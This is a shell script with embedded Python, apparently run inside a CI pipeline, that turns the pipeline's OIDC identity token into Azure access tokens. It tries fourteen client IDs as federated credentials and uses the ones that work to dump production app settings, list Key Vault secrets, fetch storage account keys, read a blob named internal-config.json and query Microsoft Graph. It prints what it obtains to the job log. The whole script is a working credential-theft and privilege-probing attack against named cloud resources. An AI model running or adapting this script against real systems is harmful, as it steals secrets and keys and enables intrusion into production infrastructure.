#!/usr/bin/env bash
set -uo pipefail
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "OIDC len ${#OIDC}"
python3 - "$OIDC" "$TID" "$SUB" <<'PY'
import sys,json,urllib.request,urllib.parse,urllib.error,base64
oidc,tid,sub=sys.argv[1:4]
def post(url,data=None,headers=None):
    body=urllib.parse.urlencode(data).encode() if data else b""
    req=urllib.request.Request(url,data=body,method="POST",headers=headers or {})
    try:
        with urllib.request.urlopen(req,timeout=30) as r:
            t=r.read().decode()
            try: return r.status,json.loads(t)
            except Exception: return r.status,t
    except urllib.error.HTTPError as e:
        return e.code,e.read().decode()[:300]
    except Exception as e: return 0,repr(e)[:150]
def get(url,tok,extra=None):
    h={"Authorization":"Bearer "+tok}
    if extra: h.update(extra)
    req=urllib.request.Request(url,headers=h)
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return r.status,r.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:300]
    except Exception as e: return 0,repr(e)[:150]
def fed(cid,scope):
    s,d=post(f"https://login.microsoftonline.com/{tid}/oauth2/v2.0/token",{
      "client_id":cid,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":oidc,"scope":scope})
    if isinstance(d,dict): return d.get("access_token",""),d
    return "",{"raw":str(d)[:100]}
def claims(t):
    try:
        p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
    except Exception: return {}
IDS="""72ff278a-9e71-43ec-bac4-2ca303f8e462
891fb158-e02c-4428-a885-53b811f369c0
462d1c38-4459-48b8-9333-82e389e59514
038bc35d-131d-4953-9985-ff4a245ccec1
12ed54de-f2eb-4784-804c-3a7a3e83a9e9
6eb124e3-de61-4fc9-a124-213d98d737f5
58108da8-044e-4d7e-9a46-92e6179b30be
2c34300e-1bc0-41e7-9c1e-8b7571d72c72
881fddce-6208-4af5-a297-7e79c912f83c
7c2e61eb-f928-45cd-99c9-20da958dd216
1ead3b44-9d4b-4345-a125-d703af5f843e
7a250202-a036-4089-8de8-9d1f555a4ad9
4b0b19d5-2841-4ddd-97d0-71758cd584dd
508d121f-7373-45fd-b5bf-2772bb813f63
""".split()
ok={}
for cid in IDS:
    at,d=fed(cid,"https://management.azure.com/.default")
    if at:
        c=claims(at); ok[cid]=c
        print("OK",cid,"oid",c.get("oid"))
    else:
        print("NO",cid,d.get("error"),str(d.get("error_description",""))[:80])
print("TOTAL_OK",len(ok))
for cid,c in ok.items():
    oid=c.get("oid")
    arm,_=fed(cid,"https://management.azure.com/.default")
    kv,_=fed(cid,"https://vault.azure.net/.default")
    st,_=fed(cid,"https://storage.azure.com/.default")
    print("==",cid,oid,"arm",len(arm),"kv",len(kv),"st",len(st))
    for rg,site in [("rg-tbl-platform-prod-sea","app-tbl-storefront-prod"),("rg-tbl-reporting-prod-eus","app-tbl-reporting-prod")]:
        if not arm: break
        s,d=post(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}/config/appsettings/list?api-version=2022-03-01",headers={"Authorization":"Bearer "+arm,"Content-Length":"0"})
        if s==200:
            try: print("  APPSET",site,json.dumps(d)[:900])
            except Exception: print("  APPSET",site,str(d)[:900])
        else:
            code=""
            if isinstance(d,str):
                try: code=json.loads(d).get("error",{}).get("code","")
                except Exception: pass
            print("  APPSET",site,s,code)
    for v in ["kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"]:
        if not kv: break
        s,b=get(f"https://{v}.vault.azure.net/secrets?api-version=7.4&maxresults=25",kv)
        print("  KV",v,s,b[:220].replace("\n"," "))
    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]:
        if not arm: break
        s,d=post(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",headers={"Authorization":"Bearer "+arm,"Content-Length":"0"})
        if s==200:
            print("  LK",sa,s,json.dumps(d)[:300])
        else:
            code=""
            if isinstance(d,str):
                try: code=json.loads(d).get("error",{}).get("code","")
                except Exception: pass
            print("  LK",sa,s,code)
    if st:
        s,b=get("https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list",st,{"x-ms-version":"2022-11-02"})
        print("  BLOBLIST",s,b[:260].replace("\n"," "))
        s,b=get("https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json",st,{"x-ms-version":"2022-11-02"})
        print("  BLOBCFG",s,b[:500].replace("\n"," "))
g,_=fed("2c34300e-1bc0-41e7-9c1e-8b7571d72c72","https://graph.microsoft.com/.default")
print("GRAPH",len(g))
if g:
    s,b=get("https://graph.microsoft.com/v1.0/servicePrincipals/c15570ad-5fd2-430c-97bb-a49e9a08d95c?$select=id,appId,displayName,servicePrincipalType",g)
    print("MAP c15570ad",s,b[:300])
    s,b=get("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=3",g)
    print("APPS",s,b[:200])
PY
